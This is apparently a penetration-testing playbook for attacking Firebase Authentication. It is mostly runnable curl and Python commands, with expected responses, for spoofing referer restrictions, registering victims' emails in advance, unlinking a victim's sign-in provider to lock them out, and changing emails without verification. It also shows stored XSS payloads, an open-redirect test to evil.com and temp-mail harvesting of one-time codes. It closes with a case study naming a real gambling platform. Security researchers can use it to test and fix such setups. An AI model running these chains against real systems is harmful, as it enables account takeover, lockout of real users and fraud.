# Firebase Authentication Bypass Patterns

## When to Use
- Target uses Firebase Auth (check `/__/firebase/init.json`, `firebaseConfig` in JS)
- App uses email-link (passwordless) as primary auth method
- Firebase API key exposed in client-side code

## Pre-Check
```bash
# Get Firebase config
curl -sk "https://<auth-domain>/__/firebase/init.json"
# Extract API key from page source
curl -sk "https://<target>/" | grep -oE "AIza[A-Za-z0-9_-]{35}"
```

## Referer Restriction Bypass

Firebase API keys restricted by HTTP Referer can be bypassed from non-browser contexts:

```bash
# If blocked ("Requests from referer <empty> are blocked"):
curl -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=$KEY" \
  -H "Content-Type: application/json" \
  -H "Referer: https://www.target.com/" \
  -d '{"email":"x@x.com","password":"pass","returnSecureToken":true}'
# Referer is trivially spoofable from curl/Python/Burp — NOT a security boundary.
```

Discover allowed referer from: JS config (`window.__CONFIG__`), source HTML, or just try the main domain.

## Critical Test: Password Provider Enabled on Passwordless Apps

Many apps use `signInWithEmailLink` but forget to disable `signInWithPassword` in Firebase console.

### Step 1: Test signUp with email+password
```bash
curl -sk -H "Referer: https://<target>/" \
  "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=<API_KEY>" \
  -X POST -H "Content-Type: application/json" \
  -d '{"email":"test@attacker.com","password":"Test123!","returnSecureToken":true}'
```
- If returns `idToken` → **password provider is enabled (VULN)**
- If returns `ADMIN_ONLY_OPERATION` → signUp disabled (check signIn separately)
- If returns `OPERATION_NOT_ALLOWED` → password provider properly disabled

### Step 2: Verify account shows as registered
```bash
curl -sk -H "Referer: https://<target>/" \
  "https://identitytoolkit.googleapis.com/v1/accounts:createAuthUri?key=<API_KEY>" \
  -X POST -H "Content-Type: application/json" \
  -d '{"identifier":"test@attacker.com","continueUri":"https://<target>/login"}'
```
- `"registered": true, "signinMethods": ["password"]` = confirmed

### Step 3: Pre-registration ATO chain
1. Attacker creates account with victim's email + password
2. Victim tries to sign up → Firebase sees "already registered"
3. If victim uses email-link, it links to SAME UID attacker controls
4. Attacker has persistent password access to victim's account

### Step 4: Mass account squatting (no rate limit)
```python
for i in range(N):
    firebase_request("accounts:signUp", {
        "email": f"target{i}@domain.com",
        "password": "Pwned!123",
        "returnSecureToken": True
    })
```

## Impact Severity Guide

| Scenario | Severity |
|----------|----------|
| Password signUp on passwordless-only gambling/finance app | **High** (KYC bypass, ATO) |
| Password signUp with email verification required by backend | **Medium** (pre-reg, provider confusion) |
| Password signUp on app that already supports password login | **Info** (by design) |
| Anonymous signUp enabled (no email needed) | **Medium** (free accounts, abuse) |

## Additional Firebase Checks

### Anonymous auth
```bash
curl -sk -H "Referer: https://<target>/" \
  "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=<API_KEY>" \
  -X POST -H "Content-Type: application/json" \
  -d '{"returnSecureToken":true}'
```

### Verify email (escalate from unverified → verified)
```bash
curl -sk -H "Referer: https://<target>/" \
  "https://identitytoolkit.googleapis.com/v1/accounts:sendOobCode?key=<API_KEY>" \
  -X POST -H "Content-Type: application/json" \
  -d '{"requestType":"VERIFY_EMAIL","idToken":"<TOKEN>"}'
```

### Password reset for any user (check if enumerable)
```bash
curl -sk -H "Referer: https://<target>/" \
  "https://identitytoolkit.googleapis.com/v1/accounts:sendOobCode?key=<API_KEY>" \
  -X POST -H "Content-Type: application/json" \
  -d '{"requestType":"PASSWORD_RESET","email":"victim@email.com"}'
```

### continueUrl open redirect
```bash
curl -sk -H "Referer: https://<target>/" \
  "https://identitytoolkit.googleapis.com/v1/accounts:sendOobCode?key=<API_KEY>" \
  -X POST -H "Content-Type: application/json" \
  -d '{"requestType":"EMAIL_SIGNIN","email":"x@x.com","continueUrl":"https://evil.com","canHandleCodeInApp":true}'
# UNAUTHORIZED_DOMAIN = properly restricted
# Success = open redirect in email link
```

### Password change WITHOUT old password (ATO escalation)
```bash
# Step 1: Sign in with attacker's pre-registered credentials
SIGNIN=$(curl -sk -H "Referer: https://<target>/" \
  "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>" \
  -X POST -H "Content-Type: application/json" \
  -d '{"email":"victim@email.com","password":"AttackerPw!","returnSecureToken":true}')
FRESH_TOKEN=$(echo "$SIGNIN" | jq -r '.idToken')

# Step 2: Change password - NO old password required, just fresh idToken
curl -sk -H "Referer: https://<target>/" \
  "https://identitytoolkit.googleapis.com/v1/accounts:update?key=<API_KEY>" \
  -X POST -H "Content-Type: application/json" \
  -d "{\"idToken\":\"$FRESH_TOKEN\",\"password\":\"NewPassword!\",\"returnSecureToken\":true}"
# Returns new idToken = password changed successfully
```
- CREDENTIAL_TOO_OLD_LOGIN_AGAIN = token expired, need fresh signIn first
- Combined with pre-registration: attacker squats email → changes pw → owns account permanently
- Firebase by design: `accounts:update` with fresh token = no re-auth needed

### Email Change Without Verification (HIGH)
```bash
# accounts:update allows changing email WITHOUT sending verification!
# Step 1: Create attacker account
SIGNUP=$(curl -sk -H "Referer: https://<target>/" \
  "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=<API_KEY>" \
  -X POST -H "Content-Type: application/json" \
  -d '{"email":"attacker@evil.com","password":"AtkPass!","returnSecureToken":true}')
TOKEN=$(echo "$SIGNUP" | jq -r '.idToken')

# Step 2: Change email to ANY address (no verification sent to new email)
curl -sk -H "Referer: https://<target>/" \
  "https://identitytoolkit.googleapis.com/v1/accounts:update?key=<API_KEY>" \
  -X POST -H "Content-Type: application/json" \
  -d "{\"idToken\":\"$TOKEN\",\"email\":\"victim@target.com\",\"returnSecureToken\":true}"
# Returns: email changed, emailVerified: false
# NOTE: Firebase blocks if target email is ALREADY registered (EMAIL_EXISTS)
# Attack window: register victim emails BEFORE they sign up
```

### Delete/Unlink Provider (Victim Lockout — CRITICAL)
```bash
# After pre-registering with password, attacker can REMOVE emailLink provider
# This permanently locks the victim out of their own account!
curl -sk -H "Referer: https://<target>/" \
  "https://identitytoolkit.googleapis.com/v1/accounts:update?key=<API_KEY>" \
  -X POST -H "Content-Type: application/json" \
  -d '{"idToken":"<TOKEN>","deleteProvider":["emailLink"]}'
# Returns: providerUserInfo shows only ["password"] remaining
# Victim can NO LONGER use email-link sign-in (the app's only supported method)
# Verify with createAuthUri: signinMethods will show only ["password"]
```

### Full ATO Chain (Pre-Registration + Provider Unlinking)
```
Attack Flow:
1. Attacker calls signUp with victim@email.com + attacker password → gets UID
2. Victim later signs up on app via email-link → Firebase LINKS to SAME UID
3. Attacker calls signInWithPassword → valid token (same UID as victim)
4. Attacker exchanges Firebase token with app backend → valid app session
5. Attacker calls accounts:update with deleteProvider:["emailLink"]
6. Only "password" provider remains → victim permanently locked out
7. Attacker has persistent exclusive access to victim's account

Key insight: Firebase shares UIDs across providers for the same email.
The app backend maps UID→user, so attacker's session = victim's session.
```

### Re-add Password Provider (Persistence After Victim Recovery)
```bash
# Even if victim somehow recovers, attacker can re-add password
curl -sk -H "Referer: https://<target>/" \
  "https://identitytoolkit.googleapis.com/v1/accounts:update?key=<API_KEY>" \
  -X POST -H "Content-Type: application/json" \
  -d '{"idToken":"<TOKEN>","password":"NewPassword123!"}'
```

## Completing Email-Link Auth via Temp Email Services

When backend requires `emailLink` provider (not just `password`), intercept the OOB code:

```bash
# 1. Generate disposable email (tempmail.lol works well with Firebase)
NEW=$(curl -sk "https://api.tempmail.lol/generate")
EMAIL=$(echo "$NEW" | python3 -c "import sys,json;print(json.load(sys.stdin)['address'])")
TOKEN=$(echo "$NEW" | python3 -c "import sys,json;print(json.load(sys.stdin)['token'])")

# 2. Trigger EMAIL_SIGNIN via Firebase API (or use the target's registration form)
curl -sk -X POST "https://identitytoolkit.googleapis.com/v1/accounts:sendOobCode?key=$KEY" \
  -H "Content-Type: application/json" -H "Referer: https://<target>/" \
  -d "{\"requestType\":\"EMAIL_SIGNIN\",\"email\":\"$EMAIL\",\"continueUrl\":\"https://<target>/auth/action\"}"

# 3. Wait ~20-30s and retrieve OOB code from inbox
sleep 25
INBOX=$(curl -sk "https://api.tempmail.lol/auth/$TOKEN")
OOB=$(echo "$INBOX" | python3 -c "
import sys,json,re
for e in json.load(sys.stdin).get('email',[]):
    html=e.get('html','') or e.get('body','')
    codes=re.findall(r'oobCode=([^\s\"<>&]+)',html)
    if codes: print(codes[0].replace('&amp;','&'))
")

# 4. Sign in with email link (creates emailLink provider user)
curl -sk -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithEmailLink?key=$KEY" \
  -H "Content-Type: application/json" -H "Referer: https://<target>/" \
  -d "{\"email\":\"$EMAIL\",\"oobCode\":\"$OOB\"}"
```

**Temp email services that work with Firebase (tested June 2026):**
- `api.tempmail.lol` — generate + auth/$token polling (tokens expire ~10min)
- `api.guerrillamail.com` — sid_token based (Firebase delivery unreliable)
- `www.1secmail.com` — login/domain based (sometimes blocked)

**WebView Bridge Detection (mobile-only registration):**
If console logs show `WebView Callback Initiated` with methods like `showRegisterPage`, the registration flow requires the native mobile app WebView. Desktop browser cannot complete registration. Look for:
- `{method: "showRegisterPage", payload: ...}` — native app handles registration
- `{method: "view", payload: ...}` — page tracking
- Registration redirects back to same page instead of advancing

In this case, full authenticated testing requires the APK or a way to intercept the WebView-to-native bridge calls.

### Stored XSS via Firebase Profile Fields (JWT Injection)
```bash
# Firebase allows arbitrary displayName and photoUrl via accounts:update
# These are embedded in the JWT 'name' and 'picture' claims
curl -sk -H "Referer: https://<target>/" \
  "https://identitytoolkit.googleapis.com/v1/accounts:update?key=<API_KEY>" \
  -X POST -H "Content-Type: application/json" \
  -d '{"idToken":"<TOKEN>","displayName":"<img src=x onerror=alert(document.cookie)>","photoUrl":"javascript:alert(1)"}'
# Returns success → XSS payload stored in Firebase user profile
# Every JWT issued for this user now carries the payload in 'name' claim
```

**Impact assessment:**
- If backend passes `name` claim to frontend without sanitization → Stored XSS
- If admin panel displays user profiles → Admin XSS
- If user list/leaderboard renders displayName → mass XSS
- `photoUrl` with `javascript:` scheme → XSS if rendered as `<a href>` or `<img src>`
- Firebase does NOT sanitize these fields — it's application's responsibility

### Internal Domain Email Squatting (Privilege Escalation Attempt)
```bash
# accounts:update allows changing email to ANY unclaimed address
# Including internal corporate domains!
curl -sk -H "Referer: https://<target>/" \
  "https://identitytoolkit.googleapis.com/v1/accounts:update?key=<API_KEY>" \
  -X POST -H "Content-Type: application/json" \
  -d '{"idToken":"<TOKEN>","email":"admin@target-company.com","returnSecureToken":true}'
# If email is not already registered → SUCCESS
# Test: @target.jp, @target-company.co.jp, @parent-company.com
```

**Exploit chain:**
1. Create account with random email
2. Change email to `admin@target.com` (internal domain, unclaimed in Firebase)
3. Sign in → JWT shows `email: admin@target.com`
4. If backend grants elevated access based on email domain → privilege escalation
5. Even if no privesc: impersonation for social engineering, support abuse

**Note:** Firebase blocks if email is already registered (EMAIL_EXISTS). Attack window is unclaimed emails only. Corporate Google Workspace emails are often NOT registered in the app's Firebase project.

## Key Pitfalls
- Firebase API key is often **referer-restricted** → always add `-H "Referer: https://<target>/"`
- `ADMIN_ONLY_OPERATION` on anonymous doesn't mean password is also blocked — test separately
- Token from password signUp has `sign_in_provider: "password"` in JWT — backend may reject if it checks provider
- Some apps accept the Firebase token for auth but require additional registration steps (204 but still 401 on protected endpoints)
- Backend may check `firebase.sign_in_provider` claim — password provider token gets 401 even with emailVerified=true. Only `emailLink` provider tokens grant full access on email-link-only apps.
- `emailVerified` cannot be set client-side via `accounts:update` — Firebase ignores the field (server-side only)
- OOB codes are single-use — if consumed via API, the browser/app flow will get INVALID_OOB_CODE
- Temp email tokens expire quickly (~10min) — poll immediately after sending the sign-in link
- Always clean up test accounts after PoC: `accounts:delete` with idToken

## WinTicket Case Study (June 2026)
- App uses email-link only for auth
- Password signUp NOT disabled → unlimited account creation
- `/v1/auth/email/token` on api.winticket.jp accepts password-provider tokens (200, returns app token)
- Mass pre-registration confirmed (5 accounts in 5s, no rate limit)
- `accounts:update` email change WITHOUT verification confirmed (emailVerified:false)
- `deleteProvider:["emailLink"]` confirmed — removes victim's only login method
- Full ATO chain proven: pre-register → signInWithPassword → get app token → unlink emailLink → victim locked out
- Severity: HIGH→CRITICAL (gambling platform, real money, full account takeover + victim lockout)
- Key escalation: initial finding was "Medium — account squatting" but chaining email change + provider unlinking + app token exchange = full ATO
